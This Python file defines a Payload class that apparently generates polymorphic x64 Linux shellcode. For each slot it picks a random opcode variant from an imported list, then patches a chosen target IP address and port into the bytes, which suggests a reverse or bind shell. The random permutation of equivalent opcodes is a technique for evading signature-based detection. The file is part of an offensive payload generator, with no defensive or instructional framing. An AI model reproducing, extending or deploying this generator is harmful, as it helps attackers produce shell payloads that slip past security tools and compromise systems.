from opcodes import permut_list
from random import randint
from utils import *

class Payload:
    def __init__(self,platform,port,ip):
        self.shellcode = ""
        self.platform = platform
        self.arch = "x64"
        self.target_port = port
        self.target_ip = ip

    def __str__(self):
        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.target_ip}\nPort: {self.target_port} \nShellcode:\n{self.shellcode}"

    def permut(self):
        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_hex(self.target_port)) # Weird trick for the moment to swap the port (to change)
        permut_list[17][0] = permut_list[17][0].replace(r"\x7f\x01\x01\x01", ip_to_hex(self.target_ip)) # Weird trick for the moment to swap the ip (to change)
        
        if self.platform == "Linux":
            for line in permut_list:
                    self.shellcode += line[randint(0,len(line)-1)]

    def get_bytes_size(self):
        return self.shellcode.count(r"\x")